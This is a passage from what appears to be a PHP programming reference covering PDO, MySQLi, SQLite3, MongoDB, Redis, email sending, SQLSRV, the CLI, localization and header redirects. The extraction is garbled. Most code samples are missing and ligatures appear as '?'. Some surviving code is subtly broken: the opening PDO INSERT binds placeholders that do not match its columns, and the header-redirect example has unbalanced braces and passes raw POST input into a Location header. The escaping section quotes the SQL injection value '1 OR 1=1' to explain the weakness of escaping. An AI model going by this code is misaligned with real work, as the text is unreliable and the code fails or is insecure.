// In this example we are using MySQL but this applies to any database that has support for transactions
$db = new PDO('mysql:host=' . $host . ';dbname=' . $dbname . ';charset=utf8', $username,
$password);

// Make sure that PDO will throw an exception in case of error to make error handling easier
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

try {
    // From this point and until the transaction is being committed every change to the database can be reverted
$db->beginTransaction();

// Insert the metadata of the order into the database
$preparedStatement = $db->prepare(
'INSERT INTO `orders` (`order_id`, `name`, `address`, `created_at`) VALUES (:name, :address, :telephone, :created_at)'
);

$preparedStatement->execute([ 'name' => $name, 'address' => $address,
'telephone' => $telephone, 'created_at' => time(),
]);

// Get the generated `order_id`
$orderId = $db->lastInsertId();

// Construct the query for inserting the products of the order
     $insertProductsQuery = 'INSERT INTO `orders_products` (`order_id`, `product_id`, `quantity`) VALUES';

$count = 0;
foreach ( $products as $productId => $quantity ) {
$insertProductsQuery .= ' (:order_id' . $count . ', :product_id' . $count . ', :quantity' .
$count . ')';

$insertProductsParams['order_id' . $count] = $orderId;
$insertProductsParams['product_id' . $count] = $productId;
$insertProductsParams['quantity' . $count] = $quantity;

++$count;
}

// Insert the products included in the order into the database
$preparedStatement = $db->prepare($insertProductsQuery);
$preparedStatement->execute($insertProductsParams);

// Make the changes to the database permanent
$db->commit();
}
catch ( PDOException $e ) {
// Failed to insert the order into the database so we rollback any changes
$db->rollback(); throw $e;
}

Section 58.4: PDO: connecting to MySQL/MariaDB server
There are two ways to connect to a MySQL/MariaDB server, depending on your infrastructure.

Standard (TCP/IP) connection

Since PDO was designed to be compatible with older MySQL server versions (which did not have support for prepared statements), you have to explicitly disable the emulation. Otherwise, you will lose the added injection prevention bene?ts, that are usually granted by using prepared statements.
Another design compromise, that you have to keep in mind, is the default error handling behavior. If not otherwise con?gured, PDO will not show any indications of SQL errors.
It is strongly recommended setting it to "exception mode", because that gains you additional functionality, when writing persistence abstractions (for example: having an exception, when violating UNIQUE constraint).
Socket connection

On unix-like systems, if host name is 'localhost', then the connection to the server is made through a domain socket.
Section 58.5: PDO: Get number of a?ected rows by a query
We start o? with $db, an instance of the PDO class. After executing a query we often want to determine the number of rows that have been a?ected by it. The rowCount() method of the PDOStatement will work nicely:
$query = $db->query("DELETE FROM table WHERE name = 'John'"); $count = $query->rowCount(); echo "Deleted
$count rows named John";

NOTE: This method should only be used to determine the number of rows a?ected by INSERT, DELETE, and UPDATE statements. Although this method may work for SELECT statements as well, it is not consistent across all databases.
Section 58.6: PDO::lastInsertId()
You may often ?nd the need to get the auto incremented ID value for a row that you have just inserted into your database table. You can achieve this with the lastInsertId() method.




In postgresql and oracle, there is the RETURNING Keyword, which returns the speci?ed columns of the currently inserted / modi?ed rows. Here example for inserting one entry:


Chapter 59: PHP MySQLi
The mysqli interface is an improvement (it means "MySQL Improvement extension") of the mysql interface, which was deprecated in version 5.5 and is removed in version 7.0. The mysqli extension, or as it is sometimes known, the MySQL improved extension, was developed to take advantage of new features found in MySQL systems versions
4.1.3 and newer. The mysqli extension is included with PHP versions 5 and later.

Section 59.1: Close connection
When we are ?nished querying the database, it is recommended to close the connection to free up resources.

Object oriented style


Procedural style


Note: The connection to the server will be closed as soon as the execution of the script ends, unless it's closed earlier by explicitly calling the close connection function.
Use Case: If our script has a fair amount of processing to perform after fetching the result and has retrieved the full result set, we de?nitely should close the connection. If we were not to, there's a chance the MySQL server will reach its connection limit when the web server is under heavy use.
Section 59.2: MySQLi connect
Object oriented style

Connect to Server


Set the default database: $conn->select_db("my_db");

Connect to Database


Procedural style

Connect to Server


Set the default database: mysqli_select_db($conn, "my_db");

Connect to Database


Verify Database Connection

Object oriented style


Procedural style


Section 59.3: Loop through MySQLi results
PHP makes it easy to get data from your results and loop over it using a while statement. When it fails to get the next row, it returns false, and your loop ends. These examples work with
mysqli_fetch_assoc - Associative array with column names as keys mysqli_fetch_object - stdClass object with column names as variables
mysqli_fetch_array - Associative AND Numeric array (can use arguments to get one or the other)
mysqli_fetch_row - Numeric array

Object oriented style


Procedural style


To get exact information from results, we can use:


Section 59.4: Prepared statements in MySQLi
Please read Preventing SQL injection with Parametrized Queries for a complete discussion of why prepared statements help you secure your SQL statements from SQL Injection attacks
The $conn variable here is a MySQLi object. See MySQLi connect example for more details. For both examples, we assume that $sql is


The ? represents the values we will provide later. Please note that we do not need quotes for the placeholders, regardless of the type. We can also only provide placeholders in the data portions of the query, meaning SET, VALUES and WHERE. You cannot use placeholders in the SELECT or FROM portions.

Object oriented style


Procedural style


The ?rst parameter of $stmt->bind_param or the second parameter of mysqli_stmt_bind_param is determined by the data type of the corresponding parameter in the SQL query:
Parameter Data type of the bound parameter
i	integer
d	double
s	string
b	blob

Your list of parameters needs to be in the order provided in your query. In this example si means the ?rst parameter (column_2 = ?) is string and the second parameter (column_3 > ?) is integer.
For retrieving data, see How to get data from a prepared statement

Section 59.5: Escaping Strings
Escaping strings is an older (and less secure) method of securing data for insertion into a query. It works by using MySQL's function mysql_real_escape_string() to process and sanitize the data (in other words, PHP is not doing the escaping). The MySQLi API provides direct access to this function


At this point, you have a string that MySQL considers to be safe for use in a direct query


So why is this not as secure as prepared statements? There are ways to trick MySQL to produce a string it considers

safe. Consider the following example


1 OR 1=1 does not represent data that MySQL will escape, yet this still represents SQL injection. There are other examples as well that represent places where it returns unsafe data. The problem is that MySQL's escaping function is designed to make data comply with SQL syntax. It's NOT designed to make sure that MySQL can't confuse user data for SQL instructions.
Section 59.6: Debugging SQL in MySQLi
So your query has failed (see MySQLi connect for how we made $conn)


How do we ?nd out what happened? $result is false so that's no help. Thankfully the connect $conn can tell us what MySQL told us about the failure


or procedural


You should get an error similar to

Table 'my_db.non_existent_table' doesn't exist

Section 59.7: MySQLi query
The query function takes a valid SQL string and executes it directly against the database connection $conn

Object oriented style


Procedural style



CAUTION


A common problem here is that people will simply execute the query and expect it to work (i.e. return a mysqli_stmt object). Since this function takes only a string, you're building the query ?rst yourself. If there are any mistakes in the SQL at all, the MySQL compiler will fail, at which point this function will return false.


The above code will generate a E_FATAL error because $result is false, and not an object.

PHP Fatal error: Call to a member function fetch_assoc() on a non-object


The procedural error is similar, but not fatal, because we're just violating the expectations of the function.


You will get the following message from PHP

mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given


You can avoid this by doing a test ?rst


Section 59.8: How to get data from a prepared statement
Prepared statements

See Prepared statements in MySQLi for how to prepare and execute a query.
Binding of results Object-oriented style


Procedural style


The problem with using bind_result is that it requires the statement to specify the columns that will be used. This means that for the above to work the query must have looked like this SELECT forename FROM users. To include more columns simply add them as parameters to the bind_result function (and ensure that you add them to the SQL query).

In both cases, we're assigning the forename column to the $forename variable. These functions take as many arguments as columns you want to assign. The assignment is only done once, since the function binds by reference.

We can then loop as follows:

Object-oriented style


Procedural style


The drawback to this is that you have to assign a lot of variables at once. This makes keeping track of large queries di?cult. If you have MySQL Native Driver (mysqlnd) installed, all you need to do is use get_result.
Object-oriented style


Procedural style


This is much easier to work with because now we're getting a mysqli_result object. This is the same object that mysqli_query returns. This means you can use a regular result loop to get your data.

What if I cannot install mysqlnd?

If that is the case then @Sophivorus has you covered with this amazing answer.

This function can perform the task of get_result without it being installed on the server. It simply loops through the results and builds an associative array


We can then use the function to get results like this, just as if we were using mysqli_fetch_assoc()


It will have the same output as if you were using the mysqlnd driver, except it does not have to be installed. This is very useful if you are unable to install said driver on your system. Just implement this solution.

Section 59.9: MySQLi Insert ID
Retrieve the last ID generated by an INSERT query on a table with an AUTO_INCREMENT column.

Object-oriented Style


Procedural Style



Returns zero if there was no previous query on the connection or if the query did not update an AUTO_INCREMENT value.

Insert id when updating rows

Normally an UPDATE statement does not return an insert id, since an AUTO_INCREMENT id is only returned when a new row has been saved (or inserted). One way of making updates to the new id is to use INSERT ... ON DUPLICATE KEY UPDATE syntax for updating.

Setup for examples to follow:


The case of IODKU performing an "update" and LAST_INSERT_ID() retrieving the relevant id:


The case where IODKU performs an "insert" and LAST_INSERT_ID() retrieves the new id:



Resulting table contents:


Chapter 60: SQLite3
Section 60.1: SQLite3 Quickstart Tutorial
This is a complete example of all the commonly used SQLite related APIs. The aim is to get you up and running really fast. You can also get a runnable PHP ?le of of this tutorial.
Creating/opening a database

Let's create a new database ?rst. Create it only if the ?le doesn't exist and open it for reading/writing. The extension of the ?le is up to you, but .sqlite is pretty common and self-explanatory.

Creating a table

Inserting sample data.

It's advisable to wrap related queries in a transaction (with keywords BEGIN and COMMIT), even if you don't care about atomicity. If you don't do this, SQLite automatically wraps every single query in a transaction, which slows down everything immensely. If you're new to SQLite, you may be surprised why the INSERTs are so slow .


Insert potentially unsafe data with a prepared statement. You can do this with named parameters:

Fetching data

Let's fetch today's visits of user #42. We'll use a prepared statement again, but with numbered parameters this time, which are more concise:




Note: If there are no more rows, fetchArray() returns false. You can take advantage of this in a while
loop.


Free the memory - this in not done automatically, while your script is running

Shorthands

Here's a useful shorthand for fetching a single row as an associative array. The second parameter means we want all the selected columns.
Watch out, this shorthand doesn't support parameter binding, but you can escape the strings instead. Always put the values in SINGLE quotes! Double quotes are used for table and column names (similar to backticks in MySQL).


Another useful shorthand for retrieving just one value.

Cleaning up

Finally, close the database. This is done automatically when the script ?nishes, though.


Section 60.2: Querying a database


See  also  http://stackover?ow.com/documentation/sql/topics

Section 60.3: Retrieving only one result
In addition to using LIMIT SQL statements you can also use the SQLite3 function querySingle to retrieve a single row, or the ?rst column.


Chapter 61: Using MongoDB
Section 61.1: Connect to MongoDB
Create a MongoDB connection, that later you can query:


In the next example, you will learn how to query the connection object.

This extension close the connection automatically, it's not necessary to close manually.

Section 61.2: Get multiple documents - ?nd()
Example for searching multiple users with the name "Mike":


Section 61.3: Get one document - ?ndOne()
Example for searching just one user with a speci?c id, you should do:


Section 61.4: Insert document
Example for adding a document:


Section 61.5: Update a document
Example for updating all documents where name is equal to "John":



Section 61.6: Delete a document
Example for deleting all documents where name is equal to "Peter":


Chapter 62: mongo-php
Section 62.1: Everything in between MongoDB and Php
Requirements

MongoDB server running on port usually 27017. (type mongod on command prompt to run mongodb server)
Php installed as either cgi or fpm with MongoDB extension installed(MongoDB extension is not bundled with default php)
Composer library(mongodb/mongodb).(In the project root run php composer.phar require "mongodb/mongodb=^1.0.0" to install the MongoDB library)

If everything is ok you are ready to move on.

Check For Php installation


if not sure check Php installation by running php -v on command prompt will return something like this

PHP 7.0.6 (cli) (built: Apr 28 2016 14:12:14) ( ZTS ) Copyright (c) 1997-2016 The PHP Group Zend Engine v3.0.0, Copyright (c) 1998-2016 Zend Technologies


Check For MongoDB installation


Check MongoDB installation by running mongo --version will return MongoDB shell version: 3.2.6

Check For Composer installation


Check for Composer installation by running php composer.phar --version will return Composer version 1.2-dev (3d09c17b489cd29a0c0b3b11e731987e7097797d) 2016-08-30 16:12:39 `

Connecting to MongoDB from php




The above code will connect using MongoDB composer library(mongodb/mongodb) included as vendor/autoload.php to connect to the MongoDB server running on port: 27017. If everything is ok it will connect and list an array, if exception occurs connecting to MongoDB server the message will be printed.

CREATE(Inserting) into MongoDB


In the example we are using the $mongo instance previously used in the Connecting to MongoDB from php part. MongoDB uses JSON type data format, so in php we will use array to insert data into MongoDB, this conversion from array to Json and vice versa will be done by mongo library. Every document in MongoDB has a unique id named as _id,during insertion we can get this by using $result->getInsertedId();
READ(Find) in MongoDB


Drop in MongoDB


There are many methods that can be performed on $collection see O?cial documentation from MongoDB

Chapter 63: Using Redis with PHP
Section 63.1: Connecting to a Redis instance
Assuming a default server running on localhost with the default port, the command to connect to that Redis server would be:


Section 63.2: Installing PHP Redis on Ubuntu
To install PHP on Ubuntu, ?rst install the Redis server:


then install the PHP module:


And restart the Apache server:


Section 63.3: Executing Redis commands in PHP
The Redis PHP module gives access to the same commands as the Redis CLI client so it is quite straightforward to use.
The syntax is as follow:


Chapter 64: Sending Email
Parameter	Details
string $to	The recipient email address
string $subject	The subject line
string $message	The body of the email
string $additional_headers	Optional: headers to add to the email
string $additional_parameters Optional: arguments to pass to the con?gured mail send application in the
command line

Section 64.1: Sending Email - The basics, more details, and a full example
A typical email has three main components:

1. A recipient (represented as an email address)
2. A subject
3. A message body

Sending mail in PHP can be as simple as calling the built-in function mail(). mail() takes up to ?ve parameters but the ?rst three are all that is required to send an email (although the four parameters is commonly used as will be demonstrated below). The ?rst three parameters are:

1. The recipient's email address (string)
2. The email's subject (string)
3. The body of the email (string) (e.g. the content of the email)

A minimal example would resemble the following code:


The simple example above works well in limited circumstances such as hardcoding an email alert for an internal system. However, it is common to place the data passed as the parameters for mail() in variables to make the code cleaner and easier to manage (for example, dynamically building an email from a form submission).
Additionally, mail() accepts a fourth parameter which allows you to have additional mail headers sent with your email. These headers can allow you to set:

the From name and email address the user will see
the Reply-To email address the user's response will be sent to
additional non-standards headers like X-Mailer which can tell the recipient this email was sent via PHP


The optional ?fth parameter can be used to pass additional ?ags as command line options to the program con?gured to be used when sending mail, as de?ned by the sendmail_path con?guration setting. For example, this

can be used to set the envelope sender address when using sendmail/post?x with the -f sendmail option.


Although using mail() can be pretty reliable, it is by no means guaranteed that an email will be sent when mail() is called. To see if there is a potential error when sending your email, you should capture the return value from mail(). TRUE will be returned if the mail was successfully accepted for delivery. Otherwise, you will receive FALSE.


NOTE: Although mail() may return TRUE, it does not mean the email was sent or that the email will be received by the recipient. It only indicates the mail was successfully handed over to your system's mail system successfully.

If you wish to send an HTML email, there isn't a lot more work you need to do. You need to:

1. Add the MIME-Version header
2. Add the Content-Type header
3. Make sure your email content is HTML


Here's a full example of using PHP's mail() function




See Also

O?cial documentation

mail()
      PHP mail() con?guration Related Stack Over?ow Questions
PHP mail form doesn't complete sending e-mail
How do you make sure email you send programmatically is not automatically marked as spam? How to use SMTP to send email
      Setting envelope from address Alternative Mailers
PHPMailer SwiftMailer PEAR::Mail
Email Servers

      Mercury Mail (Windows) Related Topics
Post/Redirect/Get

Section 64.2: Sending HTML Email Using mail()




This is not much di?erent then sending a plain text email. Thet key di?erences being the content body is structured like an HTML document and there are two additional headers that must be included so the email client knows to trender the email as HTML. They are:
MIME-Version: 1.0
Content-Type: text/html; charset=UTF-8

Section 64.3: Sending Email With An Attachment Using mail()
<?php

$to	= 'recipient@example.com';
$subject	= 'Email Subject';
$message	= 'This is the email message body';

$attachment = '/path/to/your/file.pdf';
$content = file_get_contents($attachment);

/* Attachment content transferred in Base64 encoding MUST be split into chunks 76 characters in length as specified by RFC 2045 section 6.8. By default, the function chunk_split() uses a chunk length of 76 with a trailing CRLF (\r\n). The 76 character requirement does not include the carriage return and line feed */
$content = chunk_split(base64_encode($content));

/* Boundaries delimit multipart entities. As stated in RFC 2046 section 5.1, the boundary MUST NOT occur in any encapsulated part. Therefore, it should be unique. As stated in the following section 5.1.1, a
boundary is defined as a line consisting of two hyphens ("--"), a parameter value, optional linear whitespace, and a terminating CRLF. */
$prefix	= "part_"; // This is an optional prefix
/* Generate a unique boundary parameter value with our prefix using the uniqid() function. The second parameter makes the parameter value more unique. */
$boundary	= uniqid($prefix, true);

// headers
$headers	= implode("\r\n", [ 'From: webmaster@example.com',
'Reply-To: webmaster@example.com', 'X-Mailer: PHP/' . PHP_VERSION,
'MIME-Version: 1.0',
// boundary parameter required, must be enclosed by quotes 'Content-Type: multipart/mixed; boundary="' . $boundary . '"', "Content-Transfer-Encoding: 7bit",
"This is a MIME encoded message." // message for restricted transports
]);

// message and attachment
$message	= implode("\r\n", [
"--" . $boundary, // header boundary delimiter line 'Content-Type: text/plain; charset="iso-8859-1"', "Content-Transfer-Encoding: 8bit",
$message,
"--" . $boundary, // content boundary delimiter line
'Content-Type: application/octet-stream; name="RenamedFile.pdf"', "Content-Transfer-Encoding: base64",
"Content-Disposition: attachment",
$content,
"--" . $boundary . "--" // closing boundary delimiter line
]);

$result = mail($to, $subject, $message, $headers); // send the email

if ($result) {
// Success! Redirect to a thank you page. Use the
// POST/REDIRECT/GET pattern to prevent form resubmissions
// when a user refreshes the page.

header('Location: http://example.com/path/to/thank-you.php', true, 303); exit;
}
else {
// Your mail was not sent. Check your logs to see if
// the reason was reported there for you.
}
Content-Transfer-Encodings

The available encodings are 7bit, 8bit, binary, quoted-printable, base64, ietf-token, and x-token. Of these encodings, when a header has a multipart Content-Type, the Content-Transfer-Encoding must not be any other value other than 7bit, 8bit, or binary as stated in RFC 2045, section 6.4.
Our example chooses the 7bit encoding, which represents US-ASCII characters, for the multipart header because, as noted in RFC 2045 section 6, some protocols support only this encoding. Data within the boundaries can then be encoded on a part-by-part basis (RFC 2046, section 5.1). This example does exactly this. The ?rst part, which contains the text/plain message, is de?ned to be 8bit since it may be necessary to support additional characters. In this case, the Latin1 (iso-8859-1) character set is being used. The second part is the attachment and so it is de?ned as a base64-encoded application/octet-stream. Since base64 transforms arbitrary data into the 7bit range, it can be sent over restricted transports (RFC 2045, section 6.2).
Section 64.4: Sending Plain Text Email Using PHPMailer
Basic Text Email




Adding addtional recipients, CC recipients, BCC recipients

<?php

$mail = new PHPMailer();

$mail->From	= "from@example.com";
$mail->FromName = "Full Name";
$mail->addReplyTo("reply@example.com", "Reply Address");
$mail->addAddress("recepient1@example.com", "Recepient Name");
$mail->addAddress("recepient2@example.com");
$mail->addCC("cc@example.com");
$mail->addBCC("bcc@example.com");
$mail->Subject = "Subject Text";
$mail->Body	= "This is a sample basic text email using PHPMailer.";

if($mail->send()) {
// Success! Redirect to a thank you page. Use the
// POST/REDIRECT/GET pattern to prevent form resubmissions
// when a user refreshes the page.

header('Location: http://example.com/path/to/thank-you.php', true, 303); exit;
}
else {
echo "Error: " . $mail->ErrorInfo;
}

Section 64.5: Sending HTML Email Using PHPMailer




Section 64.6: Sending Email With An Attachment Using PHPMailer
<?php

$mail = new PHPMailer();

$mail->From	= "from@example.com";
$mail->FromName = "Full Name";
$mail->addReplyTo("reply@example.com", "Reply Address");
$mail->Subject = "Subject Text";
$mail->Body	= "This is a sample basic text email with an attachment using PHPMailer.";

// Add Static Attachment
$attachment = '/path/to/your/file.pdf';
$mail->AddAttachment($attachment , 'RenamedFile.pdf');

// Add Second Attachment, run-time created. ie: CSV to be open with Excel
$csvHeader = "header1,header2,header3";
$csvData = "row1col1,row1col2,row1col3\nrow2col1,row2col2,row2col3";

$mail->AddStringAttachment($csvHeader ."\n" . $csvData, 'your-csv-file.csv', 'base64', 'application/vnd.ms-excel');

if($mail->send()) {
// Success! Redirect to a thank you page. Use the
// POST/REDIRECT/GET pattern to prevent form resubmissions
// when a user refreshes the page.

header('Location: http://example.com/path/to/thank-you.php', true, 303); exit;
}
else {
echo "Error: " . $mail->ErrorInfo;
}

Section 64.7: Sending Plain Text Email Using Sendgrid
Basic Text Email


Adding addtional recipients, CC recipients, BCC recipients


Section 64.8: Sending Email With An Attachment Using Sendgrid


Chapter 65: Using SQLSRV
Section 65.1: Retrieving Error Messages
When a query goes wrong, it is important to fetch the error message(s) returned by the driver to identify the cause of the problem. The syntax is:


This returns an array with:

Key	Description
SQLSTATE The state that the SQL Server / OBDC Driver is in code	The SQL Server error code
message  The description of the error

It is common to use the above function like so:


Section 65.2: Fetching Query Results
There are 3 main ways to fetch results from a query:

sqlsrv_fetch_array()

sqlsrv_fetch_array() retrieves the next row as an array.


sqlsrv_fetch_array() has an optional second parameter to fetch back di?erent types of array: SQLSRV_FETCH_ASSOC, SQLSRV_FETCH_NUMERIC and SQLSRV_FETCH_BOTH(default) can be used; each returns the associative, numeric, or associative and numeric arrays, respectively.


sqlsrv_fetch_object()

sqlsrv_fetch_object() retrieves the next row as an object.



sqlsrv_fetch()

sqlsrv_fetch() makes the next row available for reading.


Section 65.3: Creating a Connection


SQLSRV also has a PDO Driver. To connect using PDO:


Section 65.4: Making a Simple Query


Note: the use of square brackets [] is to escape the word table as it is a reserved word. These work in the same way as backticks ` do in MySQL.
Section 65.5: Invoking a Stored Procedure
To call a stored procedure on the server:




Section 65.6: Making a Parameterised Query


If you plan on using the same query statement more than once, with di?erent parameters, the same can be achieved with the sqlsrv_prepare() and sqlsrv_execute() functions, as shown below:


Chapter 66: Command Line Interface (CLI)
Section 66.1: Handling Program Options
Program options can be handled with the getopt() function. It operates with a similar syntax to the POSIX getopt
command, with additional support for GNU-style long options.

#!/usr/bin/php

// a single colon indicates the option takes a value
// a double colon indicates the value may be omitted
$shortopts = "hf:v::d";
// GNU-style long options are not required
$longopts = ["help", "version"];
$opts = getopt($shortopts, $longopts);

// options without values are assigned a value of boolean false
// you must check their existence, not their truthiness
if (isset($opts["h"]) || isset($opts["help"])) { fprintf(STDERR, "Here is some help!\n"); exit;
}

// long options are called with two hyphens: "--version"
if (isset($opts["version"])) {
fprintf(STDERR, "%s Version 223.45" . PHP_EOL, $argv[0]); exit;
}

// options with values can be called like "-f foo", "-ffoo", or "-f=foo"
$file = "";
if (isset($opts["f"])) {
$file = $opts["f"];
}
if (empty($file)) {
fprintf(STDERR, "We wanted a file!" . PHP_EOL); exit(1);
}
fprintf(STDOUT, "File is %s" . PHP_EOL, $file);

// options with optional values must be called like "-v5" or "-v=5"
$verbosity = 0;
if (isset($opts["v"])) {
$verbosity = ($opts["v"] === false) ? 1 : (int)$opts["v"];
}
fprintf(STDOUT, "Verbosity is %d" . PHP_EOL, $verbosity);

// options called multiple times are passed as an array
$debug = 0;
if (isset($opts["d"])) {
$debug = is_array($opts["d"]) ? count($opts["d"]) : 1;
}
fprintf(STDOUT, "Debug is %d" . PHP_EOL, $debug);

// there is no automated way for getopt to handle unexpected options

This script can be tested like so:




Note the last method will not work because -v 5 is not valid.

Note: As of PHP 5.3.0, getopt is OS independent, working also on Windows.

Section 66.2: Argument Handling
Arguments are passed to the program in a manner similar to most C-style languages. $argc is an integer containing the number of arguments including the program name, and $argv is an array containing arguments to the program. The ?rst element of $argv is the name of the program.


Calling the above application with php example.php foo bar (where example.php contains the above code) will result in the following output:

You called the program example.php with 2 arguments Argument 1 is foo
Argument 2 is bar


Note that $argc and $argv are global variables, not superglobal variables. They must be imported into the local scope using the global keyword if they are needed in a function.
This example shows the how arguments are grouped when escapes such as "" or \ are used.

Example script


Command line




If the PHP script is run using -r:


Or code piped into STDIN of php:


Section 66.3: Input and Output Handling
When run from the CLI, the constants STDIN, STDOUT, and STDERR are prede?ned. These constants are ?le handles, and can be considered equivalent to the results of running the following commands:


The constants can be used anywhere a standard ?le handle would be:


The builtin stream addresses referenced earlier (php://stdin, php://stdout, and php://stderr) can be used in place of ?lenames in most contexts:




As an alternative, you can also use readline() for input, and you can also use echo or print or any other string printing functions for output.


Section 66.4: Return Codes
The exit construct can be used to pass a return code to the executing environment.


By default an exit code of 0 will be returned if none is provided, i.e. exit is the same as exit(0). As exit is not a function, parentheses are not required if no return code is being passed.

Return codes must be in the range of 0 to 254 (255 is reserved by PHP and should not be used). By convention, exiting with a return code of 0 tells the calling program that the PHP script ran successfully. Use a non-zero return code to tell the calling program that a speci?c error condition occurred.
Section 66.5: Restrict script execution to command line
The function php_sapi_name() and the constant PHP_SAPI both return the type of interface (Server API) that is being used by PHP. They can be used to restrict the execution of a script to the command line, by checking whether the output of the function is equal to cli.


The drupal_is_cli() function is an example of a function that detects whether a script has been executed from the command line:


Section 66.6: Behavioural di?erences on the command line
When running from the CLI, PHP exhibits some di?erent behaviours than when run from a web server. These di?erences should be kept in mind, especially in the case where the same script might be run from both environments.

No directory change When running a script from a web server, the current working directory is always that of the script itself. The code require("./stuff.inc"); assumes the ?le is in the same directory as the script. On the command line, the current working directory is the directory you're in when you call the script. Scripts that are going to be called from the command line should always use absolute paths. (Note the magic constants  DIR	and __FILE__ continue to work as expected, and return the location of the script.)
No output bu?ering The php.ini directives output_buffering and implicit_flush default to false and true, respectively. Bu?ering is still available, but must be explicitly enabled, otherwise output will always be displayed in real time.
No time limit The php.ini directive max_execution_time is set to zero, so scripts will not time out by default.
No HTML errors In the event you have enabled the php.ini directive html_errors, it will be ignored on the command line.
Di?erent php.ini can be loaded. When you are using php from cli it can use di?erent php.ini than web server do. You can know what ?le is using by running php --ini.
Section 66.7: Running your script
On either Linux/UNIX or Windows, a script can be passed as an argument to the PHP executable, with that script's options and arguments following:


This passes foo and bar as arguments to example.php.

On Linux/UNIX, the preferred method of running scripts is to use a shebang (e.g. #!/usr/bin/env php) as the ?rst line of a ?le, and set the executable bit on the ?le. Assuming the script is in your path, you can then call it directly:


Using /usr/bin/env php makes the PHP executable to be found using the PATH. Following how PHP is installed, it might not be located at the same place (such as /usr/bin/php or /usr/local/bin/php), unlike env which is commonly available from /usr/bin/env.

On Windows, you could have the same result by adding the PHP's directory and your script to the PATH and editing PATHEXT to allow .php to be detected using the PATH. Another possibility is to add a ?le named example.bat or example.cmd in the same directory as your PHP script and write this line into it:


Or, if you added PHP's directory into the PATH, for convenient use:


Section 66.8: Edge Cases of getopt()
This example shows the behaviour of getopt when the user input is uncommon:

getopt.php

Shell command line



From this example, it can be seen that:

Individual options (no colon) always carry a boolean value of false if enabled.
If an option is repeated, the respective value in the output of getopt will become an array.
Required argument options (one colon) accept one space or no space (like optional argument options) as separator
After one argument that cannot be mapped into any options, the options behind will not be mapped either.

Section 66.9: Running built-in web server
As from version 5.4, PHP comes with built-in server. It can be used to run application without need to install other http server like nginx or apache. Built-in server is designed only in controller environment for development and testing purposes.
It can be run with command php -S :

To test it create index.php ?le containing


and run command php -S localhost:8080

Now yout should be able to see content in browser. To check this, navigate to http://localhost:8080

Every access should result in log entry written to terminal



Chapter 67: Localization
Section 67.1: Localizing strings with gettext()
GNU gettext is an extension within PHP that must be included at the php.ini: extension=php_gettext.dll #Windows extension=gettext.so #Linux
The gettext functions implement an NLS (Native Language Support) API which can be used to internationalize your PHP applications.

Translating strings can be done in PHP by setting the locale, setting up your translation tables and calling gettext()
on any string you want to translate.


myPHPApp.po


gettext() loads a given post-complied .po ?le, a .mo. which maps your to-be translated strings as above. After this small bit of setup code, translations will now be looked for in the following ?le:
./locale/fr_FR/LC_MESSAGES/myPHPApp.mo.

Whenever you call gettext('some string'), if 'some string' has been translated in the .mo ?le, the translation will be returned. Otherwise, 'some string' will be returned untranslated.


Chapter 68: Headers Manipulation
Section 68.1: Basic Setting of a Header
Here is a basic setting of the Header to change to a new page when a button is clicked.

if(isset($_REQUEST['action']))
{
switch($_REQUEST['action'])
{ //Setting the Header based on which button is clicked
case 'getState':
header("Location: http://NewPageForState.com/getState.php?search=" . $_POST['search']); break;
case 'getProject':
header("Location: http://NewPageForProject.com/getProject.php?search=" .
$_POST['search']);
break;
}
else
{
GetSearchTerm(!NULL);
}
//Forms to enter a State or Project and click search
function GetSearchTerm($success)
{
if (is_null($success))
{
echo "<h4>You must enter a state or project number</h4>";
}
echo "<center><strong>Enter the State to search for</strong></center><p></p>";
//Using the $_SERVER['PHP_SELF'] keeps us on this page till the switch above determines where to
go
echo "<form action='" . $_SERVER['PHP_SELF'] . "' enctype='multipart/form-data' method='POST'>
<input type='hidden' name='action' value='getState'>
<center>State: <input type='text' name='search' size='10'></center><p></p>
<center><input type='submit' name='submit' value='Search State'></center>
</form>";

GetSearchTermProject($success);
}

function GetSearchTermProject($success)
{
echo "<center><br><strong>Enter the Project to search for</strong></center><p></p>";
echo "<form action='" . $_SERVER['PHP_SELF'] . "' enctype='multipart/form-data' method='POST'>
<input type='hidden' name='action' value='getProject'>
<center>Project Number: <input type='text' name='search' size='10'></center><p></p>
<center><input type='submit' name='submit' value='Search Project'></center>
</form>";
}

?>

Chapter 69: Coding Conventions
Section 69.1: PHP Tags
You should always use <?php ?> tags or short-echo tags <?= ?>. Other variations (in particular, short tags <? ?>) should not be used as they are commonly disabled by system administrators.

When a ?le is not expected to produce output (the entire ?le is PHP code) the closing ?> syntax should be omitted to avoid unintentional output, which can cause problems when a client parses the document, in particular some browsers fail to recognise the <!DOCTYPE tag and activate Quirks Mode.
Example of a simple PHP script:


Example class de?nition ?le:


Example of PHP embedded in HTML:


Chapter 70: Asynchronous programming
Section 70.1: Advantages of Generators
PHP 5.5 introduces Generators and the yield keyword, which allows us to write asynchronous code that looks more like synchronous code.
The yield expression is responsible for giving control back to the calling code and providing a point of resumption at that place. One can send a value along the yield instruction. The return value of this expression is either null or the value which was passed to Generator::send().


This mechanism can be used by a coroutine implementation to wait for Awaitables yielded by the Generator (by registering itself as a callback for resolution) and continue execution of the Generator as soon as the Awaitable is resolved.
Section 70.2: Using Icicle event loop
Icicle uses Awaitables and Generators to create Coroutines.




Section 70.3: Spawning non-blocking processes with proc_open()
PHP has no support for running code concurrently unless you install extensions such as pthread. This can be sometimes bypassed by using proc_open() and stream_set_blocking() and reading their output asynchronously.
If we split code into smaller chunks we can run it as multiple suprocesses. Then using stream_set_blocking() function we can make each subprocess also non-blocking. This means we can spawn multiple subprocesses and then check for their output in a loop (similarly to an even loop) and wait until all of them ?nish.
As an example we can have a small subprocess that just runs a loop and in each iteration sleeps randomly for 100 - 1000ms (note, the delay is always the same for one subprocess).


Then the main process will spawn subprocesses and read their output. We can split it into smaller blocks:

Spawn subprocesses with proc_open() .
Make each subprocess non-blocking with stream_set_blocking(). Run a loop until all subprocesses ?nish using proc_get_status().
Properly close ?le handles with the output pipe for each subprocess using fclose() and close process handles with proc_close().




The output then contains mixture from all three subprocesses as they we're read by fread() (note, that in this case
proc1 ended much earlier than the other two):


Section 70.4: Reading serial port with Event and DIO
DIO streams are currently not recognized by the Event extension. There is no clean way to obtain the ?le descriptor encapsulated into the DIO resource. But there is a workaround:

open stream for the port with fopen();
make the stream non-blocking with stream_set_blocking();
obtain numeric ?le descriptor from the stream with EventUtil::getSocketFd();
pass the numeric ?le descriptor to dio_fdopen() (currently undocumented) and get the DIO resource; add an Event with a callback for listening to the read events on the ?le descriptor;
in the callback drain the available data and process it according to the logic of your application.

dio.php

